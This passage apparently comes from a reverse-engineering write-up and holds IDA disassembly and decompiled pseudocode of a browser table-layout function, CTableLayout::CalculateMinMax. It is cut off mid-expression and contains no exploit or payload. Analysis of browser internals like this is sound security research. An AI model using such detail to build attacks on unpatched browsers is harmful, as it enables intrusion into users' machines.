45 C4 01 00 00 00          mov     [ebp+var_3C], 1.text:74D2A364.text:74D2A36B.text:74D2A36B                               loc_74D2A36B:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1A4D↓j.text:74D2A36B                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1BC6↓j.text:74D2A36B                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1BD3↓j.text:74D2A36B                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1BEA↓j.text:74D2A36B 8B 45 C4                      mov     eax, [ebp+var_3C].text:74D2A36E 8B 4D C0                      mov     ecx, [ebp+var_40].text:74D2A371 29 45 F4                      sub     [ebp+var_C], eax.text:74D2A374 8D 0C 81                      lea     ecx, [ecx+eax*4].text:74D2A377 6B C0 1C                      imul    eax, 1Ch.text:74D2A37A 03 F0                         add     esi, eax.text:74D2A37C 83 7D F4 00                   cmp     [ebp+var_C], 0.text:74D2A380 89 4D C0                      mov     [ebp+var_40], ecx.text:74D2A383 EB BC                         jmp     short loc_74D2A341.text:74D2A383.text:74D2A385                               ; ---------------------------------------------------------------------------.text:74D2A385.text:74D2A385                               loc_74D2A385:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+24D↑j.text:74D2A385                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+2CC↑j.text:74D2A385 FF 4D E0                      dec     [ebp+var_20].text:74D2A388 83 45 EC 04                   add     [ebp+var_14], 4.text:74D2A38C 83 7D E0 00                   cmp     [ebp+var_20], 0.text:74D2A390 0F 8F 20 FF FF FF             jg      loc_74D2A2B6.text:74D2A390.text:74D2A396 83 7D DC 00                   cmp     [ebp+var_24], 0.text:74D2A39A 74 30                         jz      short loc_74D2A3CC.text:74D2A39A.text:74D2A39C 8B 85 7C FF FF FF             mov     eax, [ebp+var_84].text:74D2A3A2 83 65 C0 00                   and     [ebp+var_40], 0.text:74D2A3A6 83 65 E4 00                   and     [ebp+var_1C], 0.text:74D2A3AA C1 E8 02                      shr     eax, 2.text:74D2A3AD 85 C0                         test    eax, eax.text:74D2A3AF 0F 8F 03 53 19 00             jg      loc_74EBF6B8.text:74D2A3AF.text:74D2A3B5.text:74D2A3B5                               loc_74D2A3B5:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195701↓j.text:74D2A3B5 8B 45 DC                      mov     eax, [ebp+var_24].text:74D2A3B8 2B 45 C0                      sub     eax, [ebp+var_40].text:74D2A3BB 74 0F                         jz      short loc_74D2A3CC.text:74D2A3BB.text:74D2A3BD FF 75 10                      push    [ebp+arg_8].text:74D2A3C0 FF 75 D4                      push    [ebp+var_2C]                    ; int.text:74D2A3C3 FF 75 0C                      push    [ebp+arg_4]                     ; struct CTableColCalc *.text:74D2A3C6 53                            push    ebx                             ; struct CTableCalcInfo *.text:74D2A3C7 E8 5F AB F4 FF                call    ?AdjustForColSpan@CTableLayout@@QAEXPAVCTableCalcInfo@@PAVCTableColCalc@@H@Z ; CTableLayout::AdjustForColSpan(CTableCalcInfo *,CTableColCalc *,int).text:74D2A3C7.text:74D2A3CC.text:74D2A3CC                               loc_74D2A3CC:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+238↑j.text:74D2A3CC                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+322↑j.text:74D2A3CC                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+343↑j.text:74D2A3CC 8B 43 44                      mov     eax, [ebx+44h].text:74D2A3CF A8 02                         test    al, 2.text:74D2A3D1 74 0B                         jz      short loc_74D2A3DE.text:74D2A3D1.text:74D2A3D3 A9 00 04 00 00                test    eax, 400h.text:74D2A3D8 0F 85 03 87 FD FF             jnz     loc_74D02AE1.text:74D2A3D8.text:74D2A3DE.text:74D2A3DE                               loc_74D2A3DE:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+359↑j.text:74D2A3DE 8B 4D 0C                      mov     ecx, [ebp+arg_4].text:74D2A3E1 F6 41 7C 04                   test    byte ptr [ecx+7Ch], 4.text:74D2A3E5 0F 85 F6 86 FD FF             jnz     loc_74D02AE1.text:74D2A3E5.text:74D2A3EB.text:74D2A3EB                               loc_74D2A3EB:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-A7427↑j.text:74D2A3EB                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-A740E↑j.text:74D2A3EB                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-2758F↑j.text:74D2A3EB                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195433↓j.text:74D2A3EB 8B 83 34 01 00 00             mov     eax, [ebx+134h].text:74D2A3F1 85 C0                         test    eax, eax.text:74D2A3F3 0F 85 8B 53 19 00             jnz     loc_74EBF784.text:74D2A3F3.text:74D2A3F9.text:74D2A3F9                               loc_74D2A3F9:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195748↓j.text:74D2A3F9 33 C9                         xor     ecx, ecx.text:74D2A3FB 33 C0                         xor     eax, eax.text:74D2A3FD 39 4D 08                      cmp     [ebp+arg_0], ecx.text:74D2A400 74 3E                         jz      short loc_74D2A440.text:74D2A400.text:74D2A402 8B B3 9C 00 00 00             mov     esi, [ebx+9Ch].text:74D2A408 3B 75 D4                      cmp     esi, [ebp+var_2C].text:74D2A40B 77 33                         ja      short loc_74D2A440.text:74D2A40B.text:74D2A40D 8B 53 44                      mov     edx, [ebx+44h].text:74D2A410 C1 EA 15                      shr     edx, 15h.text:74D2A413 83 E2 01                      and     edx, 1.text:74D2A413.text:74D2A416.text:74D2A416                               loc_74D2A416:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+3C6↓j.text:74D2A416 03 46 04                      add     eax, [esi+4].text:74D2A419 03 0E                         add     ecx, [esi].text:74D2A41B BF FF FF FF 3F                mov     edi, 3FFFFFFFh.text:74D2A420 3B C7                         cmp     eax, edi.text:74D2A422 0F 8F A0 53 19 00             jg      loc_74EBF7C8.text:74D2A422.text:74D2A428.text:74D2A428                               loc_74D2A428:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195752↓j.text:74D2A428 85 D2                         test    edx, edx.text:74D2A42A 75 0C                         jnz     short loc_74D2A438.text:74D2A42A.text:74D2A42C F6 46 14 28                   test    byte ptr [esi+14h], 28h.text:74D2A430 75 06                         jnz     short loc_74D2A438.text:74D2A430.text:74D2A432 FF 83 E0 00 00 00             inc     dword ptr [ebx+0E0h].text:74D2A432.text:74D2A438.text:74D2A438                               loc_74D2A438:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+3B2↑j.text:74D2A438                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+3B8↑j.text:74D2A438 83 C6 1C                      add     esi, 1Ch.text:74D2A43B 3B 75 D4                      cmp     esi, [ebp+var_2C].text:74D2A43E 76 D6                         jbe     short loc_74D2A416.text:74D2A43E.text:74D2A440.text:74D2A440                               loc_74D2A440:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+388↑j.text:74D2A440                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+393↑j.text:74D2A440 39 4B 58                      cmp     [ebx+58h], ecx.text:74D2A443 7D 03                         jge     short loc_74D2A448.text:74D2A443.text:74D2A445 89 4B 58                      mov     [ebx+58h], ecx.text:74D2A445.text:74D2A448.text:74D2A448                               loc_74D2A448:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+3CB↑j.text:74D2A448 39 43 60                      cmp     [ebx+60h], eax.text:74D2A44B 7D 03                         jge     short loc_74D2A450.text:74D2A44B.text:74D2A44D 89 43 60                      mov     [ebx+60h], eax.text:74D2A44D.text:74D2A450.text:74D2A450                               loc_74D2A450:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+3D3↑j.text:74D2A450 8B 4B 58                      mov     ecx, [ebx+58h].text:74D2A453 33 D2                         xor     edx, edx.text:74D2A455 3B CA                         cmp     ecx, edx.text:74D2A457 0F 84 B1 7A 00 00             jz      loc_74D31F0E.text:74D2A457.text:74D2A45D.text:74D2A45D                               loc_74D2A45D:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+7E9F↓j.text:74D2A45D 8B 83 E0 00 00 00             mov     eax, [ebx+0E0h].text:74D2A463 40                            inc     eax.text:74D2A464 0F AF 83 C0 00 00 00          imul    eax, [ebx+0C0h].text:74D2A46B 03 83 BC 00 00 00             add     eax, [ebx+0BCh].text:74D2A471 03 83 B4 00 00 00             add     eax, [ebx+0B4h].text:74D2A477 03 C8                         add     ecx, eax.text:74D2A479 01 43 60                      add     [ebx+60h], eax.text:74D2A47C 89 4B 58                      mov     [ebx+58h], ecx.text:74D2A47C.text:74D2A47F.text:74D2A47F                               loc_74D2A47F:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+7E99↓j.text:74D2A47F 39 55 94                      cmp     [ebp+var_6C], edx.text:74D2A482 0F 85 47 53 19 00             jnz     loc_74EBF7CF.text:74D2A482.text:74D2A488.text:74D2A488                               loc_74D2A488:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195766↓j.text:74D2A488                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+19577A↓j.text:74D2A488                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+195783↓j.text:74D2A488 8B B3 4C 01 00 00             mov     esi, [ebx+14Ch].text:74D2A48E 8B 83 54 01 00 00             mov     eax, [ebx+154h].text:74D2A494 C1 EE 02                      shr     esi, 2.text:74D2A497 3B F2                         cmp     esi, edx.text:74D2A499 89 45 10                      mov     [ebp+arg_8], eax.text:74D2A49C 0F 8F 5E 53 19 00             jg      loc_74EBF800.text:74D2A49C.text:74D2A4A2.text:74D2A4A2                               loc_74D2A4A2:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+1957FB↓j.text:74D2A4A2 83 7D B4 00                   cmp     [ebp+var_4C], 0.text:74D2A4A6 0F 85 FB 2F F0 FF             jnz     loc_74C2D4A7.text:74D2A4A6.text:74D2A4AC.text:74D2A4AC                               loc_74D2A4AC:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-FCBCB↑j.text:74D2A4AC                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-FCBBF↑j.text:74D2A4AC                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+19525A↓j.text:74D2A4AC 8B 85 70 FF FF FF             mov     eax, [ebp+var_90].text:74D2A4B2 8B 4D 0C                      mov     ecx, [ebp+arg_4]                ; this.text:74D2A4B5 89 41 28                      mov     [ecx+28h], eax.text:74D2A4B5.text:74D2A4B8.text:74D2A4B8                               loc_74D2A4B8:                           ; CODE XREF: CTableLayout::CalculateMinMax(CTableCalcInfo *,int)-FCBE5↑j.text:74D2A4B8                                                                       ; CTableLayout::CalculateMinMax(CTableCalcInfo *,int)+18E↑j.text:74D2A4B8 8D 85 78 FF FF FF             lea     eax, [ebp+var_88].text:74D2A4BE E8 63 D6 0A 00                call    ??1CImplAry@@QAE@XZ             ; CImplAry::~CImplAry(void).text:74D2A4BE.text:74D2A4C3 5F                            pop     edi.text:74D2A4C4 5E                            pop     esi.text:74D2A4C5 5B                            pop     ebx.text:74D2A4C6 C9                            leave.text:74D2A4C7 C2 0C 00                      retn    0Ch.text:74D2A4C7.text:74D2A4C7                               ?CalculateMinMax@CTableLayout@@QAEXPAVCTableCalcInfo@@H@Z endp.text:74D2A4C7.text:74D2A4C7                               ; ---------------------------------------------------------------------------\n\n其反编译代码为\nvoid __thiscall CTableLayout::CalculateMinMax(        CTableLayout *this,        struct CTableCalcInfo *a2,        struct tagSIZE *a3,        int a4)&#123;  int v4; // edx  struct CTableRowLayout *v5; // eax  int v6; // eax  _DWORD *v7; // eax  int v8; // ecx  int v9; // eax  int v10; // ecx  int v11; // ecx  _DWORD *v12; // eax  int v13; // eax  unsigned int v14; // eax  int v15; // edi  BOOL v16; // edi  int v17; // eax  CElement *v18; // eax  CTreeNode *v19; // ecx  CUnitValue *v20; // ecx  int IsNullOrEnum; // eax  CTableCell *v22; // ecx  int v23; // edx  int v24; // eax  unsigned int v25; // eax  int v26; // ecx  int v27; // edi  struct CWidthUnitValue *v28; // eax  int v29; // eax  CLayout *v31; // ecx  CElement *v32; // esi  struct tagSIZE *v33; // esi  CTable *v34; // ecx  int AAcols; // eax  CUnitValue *v36; // ecx  BOOL v37; // eax  int v38; // eax  _DWORD *v39; // esi  CTableLayout *v40; // ecx  CTableLayout *v41; // eax  int v42; // edi  struct CTableRowLayout *v43; // eax  struct CTableRowLayout *v44; // esi  CTreeNode *v45; // ecx  const struct CCharFormat *CharFormat; // eax  CElement **v47; // edi  const struct CFancyFormat *FancyFormat; // eax  bool v49; // cc  int v50; // ecx  int v51; // eax  int v52; // eax  int v53; // ecx  int v54; // eax  int v55; // edx  int v56; // ecx  int v57; // edx  int v58; // eax  int v59; // esi  int v60; // ecx  CTableCell *v61; // ecx  CTableCell *v62; // ecx  CTableCellLayout *v63; // ecx  CUnitValue *v64; // ecx  int v65; // edx  int v66; // eax  bool v67; // zf  int v68; // eax  _BYTE *v69; // eax  int v70; // esi  CWidthUnitValue *v71; // edi  int v72; // eax  struct CLayout *UpdatedParentLayout; // eax  int v74; // eax  int v75; // eax  int NextRow; // eax  int v77; // eax  unsigned int v78; // eax  CTableCol *v80; // ecx  CUnitValue *v81; // ecx  int v82; // ecx  int v83; // eax  CTableCellLayout *UpdatedLayout; // eax  int BorderAndPaddingCore; // eax  int v86; // ecx  int v87; // eax  int v88; // eax  int *v89; // eax  CTableColCalc *v90; // edi  char *v91; // eax  int v92; // eax  int v93; // edi  int *v94; // ecx  int v95; // edx  int v96; // edi  struct CTableCellLayout *v97; // eax  CLayout *v98; // ecx  struct CCalcInfo *v99; // edi  CTableCellLayout *v100; // ecx  int v101; // eax  struct CLayoutContext *cy; // [esp-4h] [ebp-A8h]  struct CCalcInfo *v103; // [esp+0h] [ebp-A4h]  struct IUnknown **v104; // [esp+0h] [ebp-A4h]  struct CTableCalcInfo *v105; // [esp+4h] [ebp-A0h]  struct tagSIZE *v106; // [esp+8h] [ebp-9Ch]  int v107; // [esp+10h] [ebp-94h]  LONG cx; // [esp+14h] [ebp-90h]  int v109; // [esp+18h] [ebp-8Ch]  int v110; // [esp+34h] [ebp-70h]  BOOL v111; // [esp+38h] [ebp-6Ch] BYREF  CTableRowLayout *v112; // [esp+3Ch] [ebp-68h]  struct CTreeNode *v113; // [esp+40h] [ebp-64h]  BOOL v114; // [esp+44h] [ebp-60h]  CElement *v115; // [esp+48h] [ebp-5Ch]  CElement *v116; // [esp+4Ch] [ebp-58h]  int v117; // [esp+50h] [ebp-54h]  int v118; // [esp+54h] [ebp-50h]  int SpecifiedPixelWidth; // [esp+58h] [ebp-4Ch]  int v120; // [esp+5Ch] [ebp-48h]  CTableColCalc *v121; // [esp+60h] [ebp-44h]  struct CCalcInfo *v122; // [esp+64h] [ebp-40h]  int AAcolSpan; // [esp+68h] [ebp-3Ch]  int v124; // [esp+6Ch] [ebp-38h]  CWidthUnitValue *v125; // [esp+70h] [ebp-34h]  int PixelWidth; // [esp+74h] [ebp-30h]  int v127; // [esp+78h] [ebp-2Ch]  _DWORD *v128; // [esp+7Ch] [ebp-28h]  int i; // [esp+80h] [ebp-24h]  int v130; // [esp+84h] [ebp-20h]  int v131; // [esp+88h] [ebp-1Ch]  int v132; // [esp+8Ch] [ebp-18h]  CTableLayout *v133; // [esp+90h] [ebp-14h]  int v134; // [esp+94h] [ebp-10h]  struct CWidthUnitValue *v135; // [esp+98h] [ebp-Ch]  int v136; // [esp+9Ch] [ebp-8h]  int v137; // [esp+ACh] [ebp+8h]  int AAspan; // [esp+B4h] [ebp+10h]  CElement **v139; // [esp+B4h] [ebp+10h]  CElement **v140; // [esp+B4h] [ebp+10h]  cx = a3[5].cx;  v137 = *((_DWORD *)a2 + 21);  v120 = *((_DWORD *)a2 + 74) &gt;&gt; 2;  v128 = 0;  i = 0;  v136 = 0;  v125 = 0;  SpecifiedPixelWidth = CTableLayout::GetSpecifiedPixelWidth(this, (struct CTableCalcInfo *)&amp;v111);  v127 = 0;  v116 = (CElement *)*((_DWORD *)a2 + 2);  v124 = (*((_DWORD *)a2 + 17) &gt;&gt; 9) &amp; 1;  if ( v137 )  &#123;    v31 = (CLayout *)(2 * v137);    v110 = 0x7FFFFFFF / (2 * v137);  &#125;  else  &#123;    v110 = 0x3FFFFFFF;  &#125;  v32 = v116;  v114 = (*((_DWORD *)v116 + 7) &amp; 0x200) != 0 &amp;&amp; *((int *)CElement::GetMarkupPtr(v116) + 48) &gt;= 70000;  if ( SpecifiedPixelWidth || v111 || (*(_BYTE *)CTreeNode::GetFancyFormat(*((CTreeNode **)v32 + 5)) &amp; 0x20) != 0 )  &#123;    v33 = a3;    v111 = 0;  &#125;  else  &#123;    v33 = a3;    if ( *((_DWORD *)a2 + 64) )    &#123;      UpdatedParentLayout = CLayout::GetUpdatedParentLayout(v31, (struct CLayoutContext *)a3[1].cy);      if ( UpdatedParentLayout )      &#123;        v31 = (CLayout *)*((_DWORD *)UpdatedParentLayout + 2);        LOBYTE(v31) = *((_BYTE *)v31 + 24);        if ( ((_BYTE)v31 == 100 || (_BYTE)v31 == 103 || (_BYTE)v31 == 19)          &amp;&amp; (*((_BYTE *)UpdatedParentLayout + 264) &amp; 1) == 0 )        &#123;          SpecifiedPixelWidth = CTableCellLayout::GetSpecifiedPixelWidth(v31, UpdatedParentLayout, (int)a3);        &#125;      &#125;    &#125;    v111 = SpecifiedPixelWidth != 0;  &#125;  v33[5].cx = 3;  CTableLayout::CalculateBorderAndSpacing(v31, a2);  *((_DWORD *)a2 + 22) = 0;  *((_DWORD *)a2 + 24) = 0;  v117 = 0;  v118 = 0;  *((_DWORD *)a2 + 56) = 0;  AAcols = CTable::GetAAcols(v34);  v36 = (CUnitValue *)v137;  if ( v137 &gt;= AAcols )    v36 = (CUnitValue *)AAcols;  v131 = v137 - (_DWORD)v36;  *((_DWORD *)a2 + 20) = v36;  *((_DWORD *)a2 + 17) ^= (*((_DWORD *)a2 + 17) ^ ((v137 == (_DWORD)v36) &lt;&lt; 8)) &amp; 0x100;  v37 = (v33[5].cy &amp; 1) != 0 &amp;&amp; v36;  v124 |= v37;  if ( !a4 )  &#123;    if ( *((_DWORD *)a2 + 37) &gt;&gt; 2 &gt;= v137 )      goto LABEL_22;    if ( v137 &lt; 0 )    &#123;      v38 = -2147024809;    &#125;    else    &#123;      if ( (unsigned int)v137 &lt;= *((_DWORD *)a2 + 38) )      &#123;LABEL_21:        v36 = (CUnitValue *)(4 * v137);        *((_DWORD *)a2 + 37) = (4 * v137) | *((_DWORD *)a2 + 37) &amp; 3;LABEL_22:        v39 = (_DWORD *)*((_DWORD *)a2 + 39);        v133 = 0;        v128 = v39;        if ( v137 &gt; 0 )        &#123;          do          &#123;            v39[2] = 0;            v39[1] = 0;            *v39 = 0;            CUnitValue::SetNull(v36);            v40 = v133;            v39[5] &amp;= 0xFFFFFFC1;            v39[3] = 0;            if ( CTableLayout::GetCol(v40, (int)v103) &amp;&amp; CElement::IsDisplayNone(v36) )              v39[5] |= 0x20u;            v133 = (CTableLayout *)((char *)v133 + 1);            v39 += 7;          &#125;          while ( (int)v133 &lt; v137 );          v128 = v39;        &#125;        if ( *(_DWORD *)(*((_DWORD *)a2 + 2) + 48) )        &#123;          CTableLayout::LoadHistory(v36, *((struct IStream **)v116 + 12), v103);          ClearInterfaceFn(v104);          v77 = *((_DWORD *)a2 + 17);          if ( (v77 &amp; 0x200000) != 0 )            goto LABEL_117;          if ( (v77 &amp; 0x20000) != 0 )          &#123;            v78 = v77 &amp; 0xFFFDFFFF;            *((_DWORD *)a2 + 17) = v78;            if ( (v78 &amp; 2) == 0 )            &#123;              *((_DWORD *)a2 + 22) = -1;              *((_DWORD *)a2 + 24) = -1;              goto LABEL_66;            &#125;          &#125;        &#125;        else        &#123;          *((_DWORD *)a2 + 17) &amp;= ~0x200000u;        &#125;        if ( (*((_DWORD *)a2 + 17) &amp; 0x2000) == 0 )        &#123;          v130 = v120;          v41 = (CTableLayout *)*((_DWORD *)a2 + 76);          v42 = v120;          goto LABEL_30;        &#125;        v134 = 0;        v124 = 0;        v132 = 0;        CTableLayout::GetFirstRow(v36);        if ( (*((_DWORD *)a2 + 74) &amp; 0xFFFFFFFC) != 0 )          v5 = CTableRow::RowLayoutCache(*((CTableRow **)a2 + 76), v103);        else          v5 = 0;        v113 = v5;        if ( v5 )        &#123;          v36 = (CUnitValue *)(*((_DWORD *)v5 + 16) &gt;&gt; 2);          if ( (int)v36 &lt; v137 )          &#123;            if ( CTableRowLayout::EnsureCells(v36, (int)v5) )              goto LABEL_67;          &#125;        &#125;        v13 = *((_DWORD *)a2 + 37) &gt;&gt; 2;        v136 = 0;        if ( v13 )        &#123;          while ( 1 )          &#123;            v14 = *((_DWORD *)a2 + 31);            v131 = 0;            if ( v136 &lt; (int)(v14 &gt;&gt; 2) )            &#123;              v36 = (CUnitValue *)v136;              v15 = *(_DWORD *)(*((_DWORD *)a2 + 33) + 4 * v136);            &#125;            else            &#123;              v15 = 0;            &#125;            i = v15;            if ( !v15 )              goto LABEL_98;            if ( !CElement::IsDisplayNone(v36) )              break;            ++v132;LABEL_107:            v25 = *((_DWORD *)a2 + 37);            if ( ++v136 &gt;= (int)(v25 &gt;&gt; 2) )              goto LABEL_108;          &#125;          if ( CElement::IsDisplayNone(v36) )          &#123;LABEL_98:            AAspan = 1;            v16 = 0;          &#125;          else          &#123;            AAspan = CTableCol::GetAAspan(v80);            if ( AAspan &gt;= 1000 )              AAspan = 1000;            v125 = (const struct CFancyFormat *)((char *)CTreeNode::GetFancyFormat(*(CTreeNode **)(i + 20)) + 112);            v16 = CUnitValue::IsNullOrEnum(v81) == 0;          &#125;          if ( !v16 )          &#123;            if ( i &amp;&amp; AAspan != 1              || !v113              || (v17 = *(_DWORD *)(*((_DWORD *)v113 + 18) + 4 * v136), (v17 &amp; 1) != 0)              || (v18 = (CElement *)(v17 &amp; 0xFFFFFFFC),                  v19 = (CTreeNode *)*((_DWORD *)v18 + 5),                  v115 = v18,                  v125 = (const struct CFancyFormat *)((char *)CTreeNode::GetFancyFormat(v19) + 112),                  IsNullOrEnum = CUnitValue::IsNullOrEnum(v20),                  v16 = IsNullOrEnum == 0,                  IsNullOrEnum) )            &#123;LABEL_104:              v23 = *((_DWORD *)a2 + 17);              v24 = (v23 &amp; 0x100) != 0 &amp;&amp; v16;              v36 = (CUnitValue *)AAspan;              *((_DWORD *)a2 + 17) = v23 ^ (v23 ^ (v24 &lt;&lt; 8)) &amp; 0x100;              v136 = v136 + AAspan - 1;              goto LABEL_107;            &#125;            AAspan = CTableCell::GetAAcolSpan(v22);            if ( AAspan &gt;= 1000 )              AAspan = 1000;            v131 = 1;          &#125;          if ( CUnitValue::IsScalerUnit(*(_DWORD *)v125 &amp; 0xF) )          &#123;            PixelWidth = CWidthUnitValue::GetPixelWidth(v125, (const struct CDocInfo *)a3, 0, (int)v103);            if ( v114 )            &#123;              if ( v113 )              &#123;                v83 = *(_DWORD *)(*((_DWORD *)v113 + 18) + 4 * v136);                if ( (v83 &amp; 1) == 0 )                &#123;                  UpdatedLayout = CElement::GetUpdatedLayout(                                    (CElement *)(v83 &amp; 0xFFFFFFFC),                                    (struct CLayoutContext *)a3[1].cy);                  BorderAndPaddingCore = CTableCellLayout::GetBorderAndPaddingCore(                                           UpdatedLayout,                                           1,                                           (const struct CDocInfo *)a3,                                           0,                                           0);                  PixelWidth += BorderAndPaddingCore;                &#125;              &#125;            &#125;          &#125;          else          &#123;            PixelWidth = *((_DWORD *)a2 + 12) * ((v82 &gt;&gt; 4) / 100) / 100;          &#125;          v135 = (struct CWidthUnitValue *)PixelWidth;          if ( v131 )          &#123;            v122 = (struct CCalcInfo *)AAspan;            v135 = (struct CWidthUnitValue *)(PixelWidth / AAspan);          &#125;          else          &#123;            v122 = (struct CCalcInfo *)1;          &#125;          v133 = 0;          if ( AAspan &gt; 0 )          &#123;            v86 = 28 * v136;            v124 += AAspan;            for ( i = 28 * v136; ; v86 = i )            &#123;              v128 = (_DWORD *)(v86 + *((_DWORD *)a2 + 39));              if ( v131 &amp;&amp; AAspan &gt; 1 &amp;&amp; v133 == (CTableLayout *)(AAspan - 1) )              &#123;                v86 = PixelWidth - (_DWORD)v135 * (AAspan - 1);                v135 = (struct CWidthUnitValue *)v86;              &#125;              CTableColCalc::AdjustForCol((CTableColCalc *)v86, v135, (int)a3, v122, (int)v103);              v133 = (CTableLayout *)((char *)v133 + 1);              i += 28;              if ( (int)v133 &gt;= AAspan )                break;            &#125;          &#125;          v134 += PixelWidth;          v39 = v128;          goto LABEL_104;        &#125;LABEL_108:        if ( v137 - v132 != v124 )        &#123;          v26 = 1;          v135 = (struct CWidthUnitValue *)1;          if ( (0x3FFFFFFF - v134) / (v137 - v124) &gt;= 1 )            v135 = (struct CWidthUnitValue *)((0x3FFFFFFF - v134) / (v137 - v124));          v27 = v137;          v39 = (_DWORD *)*((_DWORD *)a2 + 39);          while ( v27 &gt; 0 )          &#123;            if ( (v39[5] &amp; 0x20) == 0 &amp;&amp; CUnitValue::IsNullOrEnum((CUnitValue *)v26) )            &#123;              v28 = v135;              *v39 = 1;              v39[1] = v28;            &#125;            --v27;            v39 += 7;          &#125;        &#125;LABEL_117:        if ( !v137 )          goto LABEL_47;        v29 = 28 * v137 + *((_DWORD *)a2 + 39) - 28;        goto LABEL_119;      &#125;      v38 = CImplAry::EnsureSizeWorker(v36, 0x1Cu);    &#125;    if ( v38 )      goto LABEL_67;    goto LABEL_21;  &#125;  v74 = *((_DWORD *)a2 + 35);  if ( v74 )    v75 = *(_DWORD *)(v74 + 44);  else    v75 = 0;  v42 = v120 - *((_DWORD *)a2 + 57) - v75;  v130 = v42;  NextRow = CTableLayout::GetNextRow(a2);  v36 = (CUnitValue *)*((_DWORD *)a2 + 76);  v39 = v128;  v41 = (CUnitValue *)((char *)v36 + 4 * NextRow);LABEL_30:  v49 = *((_DWORD *)a2 + 64) &lt;= 26;  v133 = v41;  if ( !v49 )  &#123;    if ( !v137 )      goto LABEL_47;    v29 = 28 * v137 + *((_DWORD *)a2 + 39) - 28;LABEL_119:    v127 = v29;    goto LABEL_47;  &#125;  *((_DWORD *)a2 + 17) |= 0x20u;  if ( v42 &lt;= 0 )    goto LABEL_44;  do  &#123;    v43 = CTableRow::RowLayoutCache(v36, v103);    v113 = v43;    if ( v43 )    &#123;      v44 = v43;      if ( *((_DWORD *)v43 + 16) &gt;&gt; 2 &lt; v137 )        CTableRowLayout::EnsureCells(v36, (int)v43);      CUnitValue::SetNull(v36);      v122 = (struct CCalcInfo *)*((_DWORD *)v44 + 18);      CharFormat = CTreeNode::GetCharFormat(v45);      v47 = (CElement **)v133;      v107 = (*(unsigned __int16 *)CharFormat &gt;&gt; 5) &amp; 1;      a3[17].cx = *(_DWORD *)v133;      FancyFormat = CTreeNode::GetFancyFormat(*((CTreeNode **)*v47 + 5));      cy = (struct CLayoutContext *)a3[1].cy;      a3[18].cx = (LONG)FancyFormat;      a3[17].cy = (LONG)CElement::GetUpdatedLayout(*v47, cy);      v39 = (_DWORD *)*((_DWORD *)a2 + 39);      v135 = (struct CWidthUnitValue *)v137;      v49 = v137 &lt;= 0;      while ( 1 )      &#123;        v128 = v39;        if ( v49 )          goto LABEL_41;        if ( (v39[5] &amp; 0x20) != 0          || (v50 = ~*(_DWORD *)v122, v115 = (CElement *)(*(_DWORD *)v122 &amp; 0xFFFFFFFC), (v50 &amp; 1) == 0) )        &#123;          AAcolSpan = 1;          goto LABEL_40;        &#125;        v90 = CElement::GetUpdatedLayout(v115, (struct CLayoutContext *)a3[1].cy);        v121 = v90;        if ( (unsigned int)v39 &gt; v127 )          v127 = (int)v39;        AAcolSpan = CTableCell::GetAAcolSpan(v61);        if ( AAcolSpan &gt;= 1000 )          AAcolSpan = 1000;        if ( !v107 )          break;LABEL_40:        v135 = (struct CWidthUnitValue *)((char *)v135 - AAcolSpan);        v36 = (struct CCalcInfo *)((char *)v122 + 4 * AAcolSpan);        v39 += 7 * AAcolSpan;        v49 = (int)v135 &lt;= 0;        v122 = v36;      &#125;      v109 = CTableCell::RowSpan(v62);      v112 = (CTableRowLayout *)*((_DWORD *)v115 + 5);      PixelWidth = CTableCellLayout::GetSpecifiedPixelWidth(v63, v90, (int)a3);      v125 = (const struct CFancyFormat *)((char *)CTreeNode::GetFancyFormat(v112) + 112);      if ( v130 == v120 )      &#123;        v39[5] ^= (v39[5] ^ (CUnitValue::IsNullOrEnum(v64) == 0)) &amp; 1;        if ( AAcolSpan &gt; 1 )        &#123;          v7 = v39 + 12;          v8 = AAcolSpan - 1;          do          &#123;            *v7 ^= (*v7 ^ v39[5]) &amp; 1;            v7 += 7;            --v8;          &#125;          while ( v8 );        &#125;      &#125;      v134 = (int)v135 &lt;= v131 || (v39[5] &amp; 1) == 0 || v130 == v120 &amp;&amp; (*(_BYTE *)v125 &amp; 0xF) == 10;      v65 = *((_DWORD *)a2 + 17);      v60 = 256;      v66 = (v65 &amp; 0x100) != 0 &amp;&amp; !v134;      v67 = v134 == 0;      *((_DWORD *)a2 + 17) = v65 ^ (v65 ^ (v66 